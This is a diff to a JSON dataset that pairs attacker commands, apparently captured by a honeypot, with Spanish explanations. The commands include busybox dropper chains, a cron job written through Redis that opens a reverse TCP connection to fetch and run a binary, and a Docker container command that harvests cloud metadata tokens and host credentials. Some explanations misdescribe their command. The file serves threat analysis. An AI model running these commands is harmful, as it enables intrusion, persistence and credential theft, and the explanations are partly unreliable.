@@ -15,6 +15,11 @@
   "glosa": "Descarga y ejecuta directamente el script remoto con wget o curl y luego muestra la cadena hexadecimal \"redtail_bot_telegram_ok\" como señal de éxito (beacon)."
  },
  {
+  "norm": "./",
+  "idioma": "es",
+  "glosa": "Intenta ejecutar un binario en el directorio actual para obtener una shell (ejecución)."
+ },
+ {
   "norm": "./tkaafx6g",
   "idioma": "es",
   "glosa": "Ejecuta el binario TKaAFX6g, que probablemente sea un dropper o payload para comprometer el sistema."
@@ -25,14 +30,29 @@
   "glosa": "Intenta conectar o enviar datos al IP 88.24.66.179, típico de una shell inversa (shell inversa)."
  },
  {
+  "norm": "/bin/busybox cat /bin/busybox || while read i; do echo $i; done < /bin/busybox",
+  "idioma": "es",
+  "glosa": "Intenta mostrar el contenido de /bin/busybox y, si falla, lo lee línea a línea y lo imprime, verificando que busybox está presente y funcional (reconocimiento)."
+ },
+ {
   "norm": "/bin/busybox cp /bin/busybox .ffaaxx; >.ffaaxx; /bin/busybox chmod 777 .ffaaxx; /bin/busybox andromeda",
   "idioma": "es",
   "glosa": "Copia el binario busybox a .ffaaxx, le otorga permisos de ejecución y lanza el programa ANDROMEDA para instalar el malware."
  },
  {
+  "norm": "/bin/busybox cp /bin/busybox condi72; >condi72; /bin/busybox chmod 777 condi72; /bin/busybox condixx",
+  "idioma": "es",
+  "glosa": "Copia /bin/busybox a un archivo llamado condi72, lo trunca, le otorga permisos de ejecución completos y luego ejecuta el binario condixx (dropper)."
+ },
+ {
   "norm": "/bin/busybox cp /bin/echo aldh ; >aldh; /bin/busybox chmod 777 aldh; /bin/busybox ckysxm4l",
   "idioma": "es",
   "glosa": "Copia /bin/echo a un archivo llamado aldh, lo vacía, le otorga permisos totales y luego intenta ejecutar cKysXm4l, preparando un binario ejecutable para el payload."
+ },
+ {
+  "norm": "/bin/busybox cp /bin/echo con ; >con; /bin/busybox chmod 777 con; /bin/busybox gol5evfg",
+  "idioma": "es",
+  "glosa": "Crea y modifica un fichero temporal para verificar si tiene permisos de escritura y capacidad para otorgar acceso total de ejecución en el sistema (reconocimiento)."
  },
  {
   "norm": "/bin/busybox echo -e '\\x50\\x6f\\x72\\x74/dev' > /dev/.none; /bin/busybox cat /dev/.none; /bin/busybox rm /dev/.none",
@@ -78,6 +98,11 @@
   "norm": "/bin/busybox echo -ne '\\xdd\\x00'; echo -ne '\\x55\\xaa'; /bin/busybox ckysxm4l",
   "idioma": "es",
   "glosa": "Envía dos secuencias de bytes (0xdd00 y 0x55aa) y luego ejecuta el binario ofuscado cKysXm4l, intentando cargar código malicioso en memoria (carga de payload)."
+ },
+ {
+  "norm": "/bin/busybox echo -ne '\\xdd\\x00'; echo -ne '\\x55\\xaa'; /bin/busybox gol5evfg",
+  "idioma": "es",
+  "glosa": "Imprime bytes en formato hexadecimal para probar si la consola procesa datos binarios sin alterarlos antes de transferir un ejecutable real (reconocimiento)."
  },
  {
   "norm": "/bin/busybox echo > /boot/.b && sh /boot/.b && cd /boot/",
@@ -250,6 +275,11 @@
   "glosa": "Descifra dos cadenas en base64 (bFRP → lTO y Nkty → 6Kr) y luego intenta ejecutar el binario cKysXm4l, lo que sirve para lanzar el payload."
  },
  {
+  "norm": "/bin/busybox echo bfrp | base64 -d; /bin/busybox echo nkty | openssl base64 -d; /bin/busybox gol5evfg",
+  "idioma": "es",
+  "glosa": "Prueba a decodificar texto en Base64 usando distintas utilidades para saber qué herramientas tiene disponibles el sistema para desempaquetar cargas maliciosas (reconocimiento)."
+ },
+ {
   "norm": "/bin/busybox wget <url> -o - > .a && /bin/busybox chmod 777 .a && ./.a telnet.wget",
   "idioma": "es",
   "glosa": "Descarga el binario tmips desde 45.150.195.235, le da permisos de ejecución y lo lanza con el argumento telnet.wget, estableciendo una posible puerta trasera telnet."
@@ -275,9 +305,19 @@
   "glosa": "Crea un archivo oculto .andromedatest en la raíz del sistema y cambia a /, comprobando si puede escribir en la raíz para usarla como zona de drop (descubrimiento)."
  },
  {
+  "norm": ">/.codi && cd /",
+  "idioma": "es",
+  "glosa": "Crea un archivo vacío .codi en la raíz del sistema y cambia al directorio raíz para marcar esa ubicación."
+ },
+ {
   "norm": ">/bin/.andromedatest && cd /bin/",
   "idioma": "es",
   "glosa": "Crea un archivo oculto .andromedatest en /bin y cambia a ese directorio, verificando si puede escribir en una ubicación de ejecutables para colocar su herramienta (descubrimiento)."
+ },
+ {
+  "norm": ">/bin/.codi && cd /bin/",
+  "idioma": "es",
+  "glosa": "Crea un archivo vacío .codi en /bin y cambia al directorio /bin para marcar esa ubicación."
  },
  {
   "norm": ">/boot/.andromedatest && cd /boot/",
@@ -285,9 +325,19 @@
   "glosa": "Crea un archivo vacío .andromedatest en /boot y cambia a ese directorio, marcando el sistema para posible persistencia o later payload (persistencia)."
  },
  {
+  "norm": ">/boot/.codi && cd /boot/",
+  "idioma": "es",
+  "glosa": "Crea un archivo vacío .codi en /boot y cambia al directorio /boot para marcar esa ubicación."
+ },
+ {
   "norm": ">/dev/.andromedatest && cd /dev/",
   "idioma": "es",
   "glosa": "Crea un archivo oculto .andromedatest en /dev y cambia a ese directorio, buscando un punto donde pueda escribir y ocultar su código (descubrimiento)."
+ },
+ {
+  "norm": ">/dev/.codi && cd /dev/",
+  "idioma": "es",
+  "glosa": "Crea un archivo vacío .codi en /dev y cambia al directorio /dev para marcar esa ubicación."
  },
  {
   "norm": ">/dev/netslink/.andromedatest && cd /dev/netslink/",
@@ -295,14 +345,29 @@
   "glosa": "Crea un archivo oculto .andromedatest en /dev/netslink y cambia a ese directorio, intentando encontrar un subdirectorio escribible para ocultar su malware (descubrimiento)."
  },
  {
+  "norm": ">/dev/netslink/.codi && cd /dev/netslink/",
+  "idioma": "es",
+  "glosa": "Crea un archivo vacío .codi en /dev/netslink y cambia al directorio /dev/netslink para marcar esa ubicación."
+ },
+ {
   "norm": ">/etc/.andromedatest && cd /etc/",
   "idioma": "es",
   "glosa": "Crea un archivo oculto .andromedatest en /etc y cambia a ese directorio, probando la capacidad de escritura en configuraciones del sistema para posible persistencia."
  },
  {
+  "norm": ">/etc/.codi && cd /etc/",
+  "idioma": "es",
+  "glosa": "Crea un archivo vacío .codi en /etc y cambia al directorio /etc para marcar esa ubicación."
+ },
+ {
   "norm": ">/mnt/.andromedatest && cd /mnt/",
   "idioma": "es",
   "glosa": "Crea un archivo oculto .andromedatest en /mnt y cambia a ese directorio, evaluando si es un punto de montaje escribible para colocar su payload (descubrimiento)."
+ },
+ {
+  "norm": ">/mnt/.codi && cd /mnt/",
+  "idioma": "es",
+  "glosa": "Crea un archivo vacío .codi en /mnt y cambia al directorio /mnt para marcar esa ubicación."
  },
  {
   "norm": ">/usr/.andromedatest && cd /usr/",
@@ -315,14 +380,29 @@
   "glosa": "Crea un archivo oculto .andromedatest en /var y cambia a ese directorio, buscando un directorio con permisos de escritura para almacenar su código (descubrimiento)."
  },
  {
+  "norm": ">/var/.codi && cd /var/",
+  "idioma": "es",
+  "glosa": "Crea un archivo vacío llamado .codi en /var y cambia al directorio /var para usarlo como punto de trabajo y marcar el sistema."
+ },
+ {
   "norm": ">/var/run/.andromedatest && cd /var/run/",
   "idioma": "es",
   "glosa": "Crea un archivo oculto .andromedatest en /var/run y cambia a ese directorio, verificando si tiene permisos de escritura para usarlo como ubicación de carga (descubrimiento)."
  },
  {
+  "norm": ">/var/run/.codi && cd /var/run/",
+  "idioma": "es",
+  "glosa": "Crea un archivo vacío .codi en /var/run y cambia al directorio /var/run para marcar esa ubicación."
+ },
+ {
   "norm": ">/var/tmp/.andromedatest && cd /var/tmp/",
   "idioma": "es",
   "glosa": "Crea un archivo oculto .andromedatest en /var/tmp y cambia a ese directorio para probar la escritura y disponer de un lugar donde dejar archivos maliciosos (descubrimiento)."
+ },
+ {
+  "norm": ">/var/tmp/.codi && cd /var/tmp/",
+  "idioma": "es",
+  "glosa": "Crea un archivo vacío .codi en /var/tmp y cambia al directorio /var/tmp para marcar esa ubicación."
  },
  {
   "norm": "[ -f /proc/version ]",
@@ -425,9 +505,19 @@
   "glosa": "Asigna un identificador único a la sesión SIP para rastrear y correlacionar los mensajes del ataque."
  },
  {
+  "norm": "cat /proc",
+  "idioma": "es",
+  "glosa": "Lee información del kernel y del sistema a través del pseudo‑sistema de archivos /proc para reconocimiento (reconocimiento)."
+ },
+ {
   "norm": "cat /tmp/.none;rm /tmp/.none;/bin/busybox ckysxm4l",
   "idioma": "es",
   "glosa": "Muestra y elimina el archivo temporal /tmp/.none para borrar evidencias y después ejecuta busybox con el argumento cKysXm4l, probablemente lanzando otro componente del malware (defensa‑evasion)."
+ },
+ {
+  "norm": "cat i > ii",
+  "idioma": "es",
+  "glosa": "Copia el contenido del archivo i al archivo ii usando cat, duplicando el binario descargado (duplicación)."
  },
  {
   "norm": "cd /proc && cat self/cmdline",
@@ -445,9 +535,29 @@
   "glosa": "Cambia al directorio /tmp, da permisos de ejecución al archivo TKaAFX6g y lo ejecuta, lo que permite al atacante lanzar su malware."
  },
  {
+  "norm": "cd /tmp || cd /var/ || cd /var/run || cd /mnt || cd /root || cd /; rm -rf i; wget <url> curl -o <url> /bin/busybox wget <url> chmod 777 i || (cp /bin/ls ii;cat i>ii;rm i;cp ii i;rm ii); ./i; echo -e '\\x63\\x6f\\x6e\\x6e\\x65\\x63\\x74\\x65\\x64'",
+  "idioma": "es",
+  "glosa": "Busca un directorio escribible, elimina cualquier archivo llamado i, descarga un binario malicioso desde el atacante, le da permisos de ejecución y lo lanza para obtener una sesión conectada (dropper)."
+ },
+ {
+  "norm": "cd /tmp || cd /var/ || cd /var/run || cd /mnt || cd /root || cd /;/bin/busybox echo -ne '\\x45\\x4c\\x46'",
+  "idioma": "es",
+  "glosa": "Cambia a un directorio accesible y escribe los bytes que forman la cabecera ELF, preparando la base de un archivo ejecutable (preparación)."
+ },
+ {
   "norm": "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget <url> curl -o <url> chmod 777 nz.sh; sh nz.sh; tftp <ip> -c get nz.sh; chmod 777 nz.sh; sh nz.sh; tftp -r 3.sh -g <ip>; chmod 777 3.sh; sh 3.sh; ftpget -v -u anonymous -p anonymous -p 21 <ip> 2.sh 2.sh; sh 2.sh; rm -rf nz.sh nz.sh 3.sh 2.sh; rm -rf *",
   "idioma": "es",
   "glosa": "Intenta cambiar a varios directorios, descarga el script nz.sh desde 41.216.189.236 usando wget, curl, tftp o ftp, le da permisos de ejecución, lo ejecuta y luego elimina los archivos y cualquier resto, sirviendo como descarga e instalación del malware con limpieza posterior."
+ },
+ {
+  "norm": "cluster nodes",
+  "idioma": "es",
+  "glosa": "Pide al servidor Redis la lista de nodos del clúster, obteniendo información sobre la topología de la red (reconocimiento)."
+ },
+ {
+  "norm": "config terminal",
+  "idioma": "es",
+  "glosa": "Solicita la configuración del terminal del servidor, lo que permite al atacante conocer parámetros del entorno (reconocimiento)."
  },
  {
   "norm": "connection: close",
@@ -465,9 +575,24 @@
   "glosa": "Indica que el mensaje no lleva cuerpo, usado para enviar una petición vacía y evitar datos innecesarios."
  },
  {
+  "norm": "cp /bin/ls ii",
+  "idioma": "es",
+  "glosa": "Copia el binario legítimo /bin/ls a un archivo llamado ii para usarlo como camuflaje o como respaldo (ocultación)."
+ },
+ {
+  "norm": "cp ii i",
+  "idioma": "es",
+  "glosa": "Duplica el archivo ii en i, creando una segunda copia del binario para su posterior uso (duplicación)."
+ },
+ {
   "norm": "cseq: 42 options",
   "idioma": "es",
   "glosa": "Envía un mensaje SIP OPTIONS con número de secuencia 42 para descubrir qué funciones soporta el servidor (reconocimiento)."
+ },
+ {
+  "norm": "echo shell_test",
+  "idioma": "es",
+  "glosa": "Muestra el texto para confirmar que la sesión de shell está activa (validación)."
  },
  {
   "norm": "enable",
@@ -540,6 +665,11 @@
   "glosa": "Ejecuta el comando id para mostrar el usuario y grupos actuales, usado para enumerar privilegios (reconocimiento)."
  },
  {
+  "norm": "image=<hex>",
+  "idioma": "es",
+  "glosa": "Guarda el identificador de la imagen 78096d0a5478 en una variable para usarla después."
+ },
+ {
   "norm": "image=alpine cmd=sh -c busybox sh -c 'echo d2dldcatty0gahr0cdovlzuumtgyljixmc42ms9vayb8ihnoihx8ign1cmwglxmgahr0cdovlzuumtgyljixmc42ms9vayb8ihno|base64 -d|sh'",
   "idioma": "es",
   "glosa": "Utiliza busybox para decodificar y ejecutar el mismo payload de descarga, sirviendo como dropper."
@@ -608,6 +738,21 @@
   "norm": "image=alpine cmd=sh -c printf '%s\\n' \"* * * * * root wget -o- <url> | sh || curl -s <url> | sh\" > /host/etc/cron.d/pwn; chmod 644 /host/etc/cron.d/pwn",
   "idioma": "es",
   "glosa": "Genera un archivo de cron en /host/etc/cron.d/pwn que cada minuto descarga y ejecuta código desde 5.182.210.61, garantizando ejecución automática (persistencia vía cron)."
+ },
+ {
+  "norm": "image=alpine:latest cmd=cat /host/proc/1/environ",
+  "idioma": "es",
+  "glosa": "Ejecuta dentro del contenedor un cat del archivo /host/proc/1/environ para leer las variables de entorno del proceso init del host y buscar información sensible (reconocimiento)."
+ },
+ {
+  "norm": "image=alpine:latest cmd=echo test",
+  "idioma": "es",
+  "glosa": "Ejecuta un contenedor Docker ligero con una orden simple para comprobar si la API de contenedores está abierta y responde a sus comandos (reconocimiento)."
+ },
+ {
+  "norm": "image=alpine:latest cmd=sh -c apk add --no-cache curl 2>/dev/null; echo '===imds==='; curl -s -h 'metadata-flavor: google' <url> 2>/dev/null; echo; echo '===env==='; cat /host/proc/1/environ | tr '\\0' '\\n' | head -50; echo; echo '===creds==='; find /host -name '*.json' -path '*google*' -o -name 'credentials*' -o -name 'service_account*' 2>/dev/null | head -10",
+  "idioma": "es",
+  "glosa": "Instala curl en Alpine, consulta el servidor de metadatos de Google para obtener un token de acceso, muestra variables de entorno y busca archivos JSON de credenciales en el host, todo para robar credenciales de la nube (recolección de credenciales)."
  },
  {
   "norm": "image=busybox cmd=sh -c busybox sh -c 'echo d2dldcatty0gahr0cdovlzuumtgyljixmc42ms9vayb8ihnoihx8ign1cmwglxmgahr0cdovlzuumtgyljixmc42ms9vayb8ihno|base64 -d|sh'",
@@ -825,6 +970,16 @@
   "glosa": "Ejecuta ping y luego lanza una shell, proporcionando al atacante una línea de comandos interactiva (shell)."
  },
  {
+  "norm": "pubsub channels",
+  "idioma": "es",
+  "glosa": "Solicita los canales de publicación/suscripción activos en Redis, descubriendo posibles vectores de comunicación (reconocimiento)."
+ },
+ {
+  "norm": "pull alpine:latest",
+  "idioma": "es",
+  "glosa": "Descarga la imagen Docker Alpine más reciente para poder crear contenedores con ella."
+ },
+ {
   "norm": "rm -rf .ffaaxx .d",
   "idioma": "es",
   "glosa": "Elimina de forma recursiva los directorios ocultos .ffaaxx y .d, borrando evidencias del malware (limpieza)."
@@ -833,6 +988,16 @@
   "norm": "rm /tmp/.t; rm /tmp/.sh; rm /tmp/.human",
   "idioma": "es",
   "glosa": "Elimina los archivos temporales /tmp/.t, /tmp/.sh y /tmp/.human para borrar rastros del ataque (limpieza)."
+ },
+ {
+  "norm": "rm i",
+  "idioma": "es",
+  "glosa": "Elimina el archivo i para borrar evidencia después de haberlo usado (limpieza)."
+ },
+ {
+  "norm": "rm ii",
+  "idioma": "es",
+  "glosa": "Elimina el archivo ii, borrando el camuflaje y reduciendo rastros (limpieza)."
  },
  {
   "norm": "save",
@@ -855,6 +1020,11 @@
   "glosa": "Crea otra tarea cron que, si el proceso identificado no está corriendo, abre una conexión TCP inversa al C2, descarga otro binario, lo marca ejecutable y lo ejecuta, proporcionando persistencia y control remoto."
  },
  {
+  "norm": "set x \"\\n* * * * * if ! ps | grep -v grep | grep -q ncfcib7cqg;then exec 6<>/dev/tcp/<ip>/<n> && echo -n 'get /linux' >&6 && cat 0<&6 > /tmp/ncfcib7cqg;fi && chmod +x /tmp/ncfcib7cqg && /tmp/ncfcib7cqg f9saefcy7biaygae1q0f4zbpfwtlegrvbhtrlugranudb8soeokx6bcuygaa1qyu7y7ofq3vaqlbahbomu4gbsscamoncos16agfyqaizqqx6zd5ea3vbadvaxt3meafds0ca8ggbu0z9xccyxwazwei6zlqhallawpofblulustbtuda9ucfum26rcgzrigzboe7y",
+  "idioma": "es",
+  "glosa": "Guarda en Redis una cadena que crea una tarea cron para abrir una conexión TCP inversa al atacante, descargar y ejecutar un binario, proporcionando acceso remoto persistente (persistencia)."
+ },
+ {
   "norm": "sh",
   "idioma": "es",
   "glosa": "Inicia una nueva shell Bourne, proporcionando al atacante una línea de comandos (shell)."
@@ -873,6 +1043,11 @@
   "norm": "ssh-2.0-putty_release_0.70",
   "idioma": "es",
   "glosa": "Envía la cadena de identificación del cliente SSH (PuTTY 0.70) para que el atacante reconozca la versión del servidor y pueda buscar vulnerabilidades específicas (reconocimiento)."
+ },
+ {
+  "norm": "start",
+  "idioma": "es",
+  "glosa": "Ejecuta el comando start, intentando lanzar un proceso o servicio que el atacante necesita (ejecución)."
  },
  {
   "norm": "su",
@@ -935,6 +1110,11 @@
   "glosa": "Ejecuta uudecode con un here‑document para decodificar datos codificados en uuencode y reconstruir el archivo binario."
  },
  {
+  "norm": "zyad5001",
+  "idioma": "es",
+  "glosa": "Envía una cadena de texto única como firma para confirmar que la consola responde e identificar esta víctima en su panel de control (reconocimiento)."
+ },
+ {
   "norm": "{",
   "idioma": "es",
   "glosa": "Comienza un cuerpo JSON, probablemente para enviar un comando o configuración al servidor (inyección)."
@@ -955,6 +1135,11 @@
   "glosa": "Transmite una secuencia de bytes sin formato que parece ser otro fragmento de payload o shellcode (dropper)."
  },
  {
+  "norm": "�3�",
+  "idioma": "es",
+  "glosa": "Cadena binaria sin formato legible, probablemente parte de un payload inicial del atacante (dropper)."
+ },
+ {
   "norm": "�xf�f�?�8�3>��c��c{�c�^�����8� ]����j��9c��ue��*i��y�]%j�&̨̩�/�0�+�,�� ��",
   "idioma": "es",
   "glosa": "Contiene datos binarios (probablemente el código malicioso) que se escribe en el archivo temporal descargado."
@@ -965,14 +1150,29 @@
   "glosa": "Datos binarios sin formato, parte del payload que será escrito o decodificado."
  },
  {
+  "norm": "��,^:�d�t4v�<�ut",
+  "idioma": "es",
+  "glosa": "Datos binarios ofuscados que parecen contener código o un shellcode para ejecutar acciones posteriores (dropper)."
+ },
+ {
   "norm": "��/5�",
   "idioma": "es",
   "glosa": "Envía datos binarios corruptos, probablemente para intentar explotar o confundir al servicio (explotación)."
  },
  {
+  "norm": "��2�c����=�2&̨̩�/�0�+�,�� ��",
+  "idioma": "es",
+  "glosa": "Bloque de bytes sin interpretación directa, usado como parte del código malicioso que será cargado en memoria (dropper)."
+ },
+ {
   "norm": "��d.�g��5_ �6�{g=�ց��ݟj�����? r��d������k��x��¡�|j������r&̨̩�/�0�+�,�� ��",
   "idioma": "es",
   "glosa": "Datos binarios sin formato, probablemente parte del payload que será decodificado o escrito en disco."
+ },
+ {
+  "norm": "��ӎ(�������.��bx#���팞d���ce@�; _�t�e�zu*�g����qb$=�?>���f�&̨̩�/�0�+�,�� ��",
+  "idioma": "es",
+  "glosa": "Secuencia binaria adicional que forma parte del mismo payload, destinada a inyectar o ejecutar código malicioso (dropper)."
  },
  {
   "norm": "���ϛmx纱��b� �b��� 4? �%�o ӽ�j'����>mqpz�_󨜑��r:����&̨̩�/�0�+�,�� ��",
@@ -983,5 +1183,10 @@
   "norm": "����`�v�s>�e�ԟ�t><f4���s�m� �|� ����n'2��u�#eb4y�",
   "idioma": "es",
   "glosa": "Otro bloque de datos binarios/garbage que probablemente completa el archivo malicioso descargado."
+ },
+ {
+  "norm": "�������sai� m�7\"�$\"���_2�m",
+  "idioma": "es",
+  "glosa": "Otro fragmento binario del payload, probablemente contiene la carga útil final que el atacante quiere ejecutar (dropper)."
  }
 ]
